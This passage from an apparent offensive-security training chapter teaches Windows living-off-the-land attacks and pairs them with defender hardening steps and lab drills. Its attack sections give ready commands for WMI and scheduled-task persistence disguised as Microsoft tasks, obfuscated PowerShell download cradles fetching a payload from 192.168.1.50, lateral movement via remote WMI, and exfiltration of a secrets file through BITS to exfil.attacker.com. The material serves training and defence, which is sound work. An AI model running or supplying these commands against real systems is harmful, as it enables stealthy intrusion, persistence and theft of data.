
### WMI Persistence (Subscription Triad)

WMI persistence survives reboots without touching the registry or filesystem. Three components: filter (trigger), consumer (action), binding (links them).

```powershell
# Component 1: Event Filter — triggers at midnight daily
$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{
    Name = "WindowsHealthFilter"
    EventNamespace = "root/cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 0"
}

# Component 2: Command Line Consumer — executes when filter fires
$consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "WindowsHealthConsumer"
    CommandLineTemplate = "powershell -NoP -NonI -W Hidden -Enc ENCODED_COMMAND_HERE"
}

# Component 3: Binding — links filter to consumer
$binding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
Write-Host "WMI persistence installed."
```

### Expected Output
```
WMI persistence installed.
(No other visible output — subscription is active in WMI namespace)
```

```powershell
# Enumerate existing subscriptions (defensive check):
Get-WMIObject -Namespace root/subscription -Class __EventFilter | Select Name, Query
Get-WMIObject -Namespace root/subscription -Class CommandLineEventConsumer | Select Name, CommandLineTemplate

# Remove WMI subscription (cleanup):
Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding | Remove-WmiObject
Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name='WindowsHealthConsumer'" | Remove-WmiObject
Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name='WindowsHealthFilter'" | Remove-WmiObject
```

---

## Section 8 — schtasks: Scheduled Task Persistence

Scheduled tasks are the most visible persistence mechanism but also the most flexible. The trick is making yours look like a legitimate system task.

### Create a Task That Runs on Logon

```cmd
:: /tn = task name (use a legitimate-looking path under Microsoft\Windows)
:: /tr = task run: the command to execute
:: /sc ONLOGON = runs when any user logs in
:: /ru SYSTEM = run as SYSTEM (requires admin, gives SYSTEM shell)
:: /f = force (overwrite if exists)
schtasks /create /tn "Microsoft\Windows\WindowsUpdate\HealthCheck" ^
  /tr "powershell -NoP -NonI -W Hidden -Enc ENCODED_CMD" ^
  /sc ONLOGON /ru SYSTEM /f
```

### Expected Output
```
SUCCESS: The scheduled task "Microsoft\Windows\WindowsUpdate\HealthCheck" has successfully been created.
```

**Failure: "Access denied"** — you need admin rights to create SYSTEM tasks.

### Create a Task That Runs at Startup

```cmd
:: /sc ONSTART = run when computer starts (before any user logs in)
schtasks /create /tn "Microsoft\Windows\Maintenance\StorageHealth" ^
  /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Enc ENCODED" ^
  /sc ONSTART /ru SYSTEM /f
```

### Find Non-Microsoft Scheduled Tasks (Defender Command)

```powershell
# Show all tasks NOT in Microsoft's namespace — find the implant
Get-ScheduledTask | Where-Object {
    $_.TaskPath -notlike "\Microsoft\*"
} | Select-Object TaskName, TaskPath, State | Format-Table -AutoSize
# Anything you don't recognise is a candidate for investigation.
```

```cmd
:: Delete a scheduled task
schtasks /delete /tn "Microsoft\Windows\Maintenance\StorageHealth" /f
```

---

## Section 9 — PowerShell Obfuscation and Evasion

AV/EDR vendors watch PowerShell closely. Script Block Logging (Event ID 4104) logs the deobfuscated script before it executes. But you can still slow defenders down.

### Technique 1: String Concatenation

```powershell
# Build "IEX" at runtime — defeats static pattern matching
$i = "I" + "E" + "X"
& ([scriptblock]::Create($i + " (New-Object Net.WebClient).DownloadString('http://192.168.1.50/pay.ps1')"))
# [scriptblock]::Create() turns a string into executable code
# & invokes the scriptblock
```

### Technique 2: cmd.exe Caret Insertion

```cmd
:: Caret ^ in cmd.exe is an escape character that is stripped at execution
:: Splits strings to defeat simple signature matching on "powershell.exe"
p^o^w^e^r^s^h^e^l^l -NoP -NonI -W Hidden -Enc ENCODED...
:: cmd.exe strips all carets and runs: powershell -NoP -NonI -W Hidden -Enc ...
```

### Technique 3: Character Code Substitution

```powershell
# Build "IEX" from ASCII character codes at runtime
$cmd = [char]73 + [char]69 + [char]88    # I=73, E=69, X=88
Invoke-Expression "$cmd (New-Object Net.WebClient).DownloadString('http://192.168.1.50/pay.ps1')"
```

---

## Section 10 — LOTL Kill Chain End-to-End

Zero custom malware until Stage 1 stub. All five stages use built-in Windows tools.

**Stage 1: Initial Access**
Victim opens phishing email, clicks `.hta` attachment. `mshta.exe` executes JScript inside the `.hta`. JScript runs certutil to download a stage1 stub from your server.

**Stage 2: Fileless Execution**
Stage1 stub runs a PowerShell IEX cradle. The real implant downloads and executes entirely in memory — never hits disk. Output goes to a temp file or back to C2.

**Stage 3: Persistence (Survivor)**
After gaining a foothold, install persistence while you have the session:
```cmd
schtasks /create /tn "Microsoft\Windows\WindowsUpdate\AutoSync" ^
  /tr "powershell -NoP -NonI -W Hidden -Enc ENCODED_CMD" ^
  /sc ONLOGON /ru SYSTEM /f
```

**Stage 4: Lateral Movement**
SYSTEM privileges allow credential dumping. Harvest creds, then move laterally via WMI:
```powershell
$process = [WMIClass]"\\192.168.1.101\root\cimv2:Win32_Process"
$process.Create("powershell -NoP -NonI -W Hidden -Enc ENCODED_CMD")
```

**Stage 5: Exfiltration**
```powershell
# Encode sensitive file as fake certificate
certutil -encode "C:\Users\admin\Documents\secrets.xlsx" "$env:TEMP\cert_update.txt"

# Upload via BITS — looks like background Windows traffic
Start-BitsTransfer -Source "$env:TEMP\cert_update.txt" -Destination "http://exfil.attacker.com/upload" -TransferType Upload
```

Full kill chain — 5 stages, zero disk artifacts after Stage 3, all using signed Microsoft tools.

---

## DEFENDER TAKEAWAY

**1. Enable PowerShell Script Block Logging (Event ID 4104)**
This logs every script BEFORE deobfuscation — most important PowerShell detection tool.
```powershell
$path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
New-Item -Path $path -Force | Out-Null
Set-ItemProperty -Path $path -Name "EnableScriptBlockLogging" -Value 1 -Type DWord
Set-ItemProperty -Path $path -Name "EnableScriptBlockInvocationLogging" -Value 1 -Type DWord
# Logs: Event Viewer > Apps and Services Logs > Microsoft > Windows > PowerShell > Operational
```

**2. Enable PowerShell Transcription**
```powershell
$path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"
New-Item -Path $path -Force | Out-Null
Set-ItemProperty -Path $path -Name "EnableTranscripting" -Value 1 -Type DWord
Set-ItemProperty -Path $path -Name "OutputDirectory" -Value "C:\PSTranscripts" -Type String
```

**3. Block certutil Network Connections via Firewall**
certutil should never reach the internet — block it:
```powershell
New-NetFirewallRule -DisplayName "Block certutil outbound" -Direction Outbound `
  -Program "C:\Windows\System32\certutil.exe" -Action Block
```

**4. Block regsvr32, mshta, wscript from Network**
```powershell
@("regsvr32.exe", "mshta.exe", "wscript.exe", "cscript.exe") | ForEach-Object {
    New-NetFirewallRule -DisplayName "Block $_ outbound" -Direction Outbound `
      -Program "C:\Windows\System32\$_" -Action Block
}
```

**5. Audit Scheduled Tasks Weekly**
```powershell
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft\*" } |
  Select-Object TaskName, TaskPath, @{n="Action"; e={$_.Actions.Execute}} |
  Format-Table -AutoSize
```

**6. Monitor WMI Subscriptions — Event IDs 19, 20, 21**
Enable WMI Activity logging: Event Viewer > Apps and Services Logs > Microsoft > Windows > WMI-Activity > Operational > Enable Log.
```powershell
# Check for existing subscriptions NOW:
Get-WMIObject -Namespace root/subscription -Class __EventFilter | Select Name, Query
Get-WMIObject -Namespace root/subscription -Class CommandLineEventConsumer | Select Name, CommandLineTemplate
# Anything you didn't create yourself is an implant.
```

**7. Deploy Sysmon with LOLBAS Rules**
The config in the Windows Setup section catches every technique in this chapter.
```powershell
# Search Sysmon for certutil network connections (Event ID 3):
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
  Where-Object { $_.Id -eq 3 -and $_.Message -like "*certutil*" } |
  Select-Object TimeCreated, Message | Format-List
```

**Hardening priority:**
1. Enable Script Block Logging — immediate, no install required
2. Block LOLBINs from outbound network via firewall
3. Deploy Sysmon with LOLBAS process creation and network rules
4. Audit scheduled tasks and WMI subscriptions weekly
5. Implement WDAC to restrict unused LOLBINs entirely

---

## Drill 19 — LOTL Lab

All exercises use built-in Windows tools. Run PowerShell as Administrator for tasks that need it.

**Exercise 1 — certutil encode/decode**

```cmd
echo This is a secret payload > C:\Windows\Temp\test_payload.txt
certutil -encode C:\Windows\Temp\test_payload.txt C:\Windows\Temp\test_b64.txt
```
Expected: `CertUtil: -encode command completed successfully.`

```cmd
type C:\Windows\Temp\test_b64.txt
certutil -decode C:\Windows\Temp\test_b64.txt C:\Windows\Temp\test_restored.txt
type C:\Windows\Temp\test_restored.txt
```
Expected: `This is a secret payload`

**Exercise 2 — PowerShell IEX with a local string**

```powershell
$payload = 'Write-Host "LOTL IEX working" -ForegroundColor Green'
IEX $payload
```
Expected: `LOTL IEX working` (green)

Now the encoded version:
```powershell
$bytes   = [System.Text.Encoding]::Unicode.GetBytes($payload)
$encoded = [Convert]::ToBase64String($bytes)
powershell -NoP -NonI -EncodedCommand $encoded
```
Expected: `LOTL IEX working`

**Exercise 3 — Create, verify, and delete a scheduled task**

```powershell
schtasks /create /tn "22DIV\DrillTask" /tr "notepad.exe" /sc ONLOGON /f
schtasks /query /tn "22DIV\DrillTask" /fo LIST

# Find it in non-Microsoft task list:
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft\*" } | Select-Object TaskName, TaskPath

# Clean up:
schtasks /delete /tn "22DIV\DrillTask" /f
```

**Exercise 4 — Audit WMI subscriptions on your machine**

```powershell
Write-Host "=== Event Filters ===" -ForegroundColor Yellow
Get-WMIObject -Namespace root/subscription -Class __EventFilter | Select Name, Query | Format-Table

Write-Host "=== Consumers ===" -ForegroundColor Yellow
Get-WMIObject -Namespace root/subscription -Class CommandLineEventConsumer | Select Name, CommandLineTemplate | Format-Table

Write-Host "=== Bindings ===" -ForegroundColor Yellow
Get-WMIObject -Namespace root/subscription -Class __FilterToConsumerBinding | Format-Table
```
Expected: Empty tables on a clean machine. Anything you did not create — investigate.

---

## Key Terms

| Term | Definition |
|------|-----------|
| **LOTL** | Living Off the Land — using legitimate OS tools for offensive purposes |
| **LOLBAS** | Living Off the Land Binaries, Scripts, and Libraries — documented collection of abusable native tools |
| **LOLBIN** | A single binary qualifying as a LOLBAS entry |
| **IEX** | Invoke-Expression — executes a string as PowerShell code |
| **Download cradle** | One-liner that downloads and executes code from URL in memory, no disk write |
| **Squiblydoo** | regsvr32.exe + scrobj.dll executing remote .sct files, bypasses AppLocker |
| **Scriptlet (.sct)** | COM automation file with JScript/VBScript, executed by scrobj.dll |
| **BITS** | Background Intelligent Transfer Service — abused for silent download and persistence |
| **WMI** | Windows Management Instrumentation — abused for remote execution and persistence |
| **WMI subscription triad** | Filter + Consumer + Binding — three WMI objects creating persistent execution |
| **WQL** | WMI Query Language — SQL-like language for querying WMI events |
| **Script Block Logging** | Logs PowerShell commands before deobfuscation (Event ID 4104) |
| **AMSI** | Antimalware Scan Interface — hooks into PowerShell/JScript/VBScript before execution |
| **WDAC** | Windows Defender Application Control — policy-based control over which executables run |
| **Transcription** | PowerShell feature writing full session transcript to a log file |
| **EncodedCommand** | PS flag accepting base64-encoded commands, bypasses execution policy |
| **Execution policy** | Controls script execution in PowerShell — NOT a security boundary |
| **Fileless malware** | Executes entirely in memory via IEX or .NET reflection, nothing on disk |
| **AppLocker** | Controls which applications users can run — bypassed by signed LOLBINs |
| **certutil** | Certificate tool abused for downloading and encoding/decoding files |
| **bitsadmin** | CLI for BITS jobs — abused for silent downloads and reboot-persistent delivery |
| **mshta.exe** | HTML Application host — executes .hta files containing VBScript/JScript |
| **regsvr32.exe** | DLL registration tool — executes remote COM scriptlets via scrobj.dll |
| **schtasks.exe** | CLI for Windows scheduled tasks — primary persistence mechanism |
| **wmic.exe** | WMI CLI — abused for local and remote command execution |
| **Sysmon** | Free Microsoft tool for detailed process, network, and file activity logging |
| **Event ID 4688** | Process creation — catch LOLBINs launching here |
| **Event ID 4104** | PowerShell Script Block Logging — most important PowerShell security event |
| **Event ID 3 (Sysmon)** | Network connection — detects certutil/bitsadmin phoning home |
| **Event ID 19/20/21 (Sysmon)** | WMI subscription created — catch implant installation in real time |
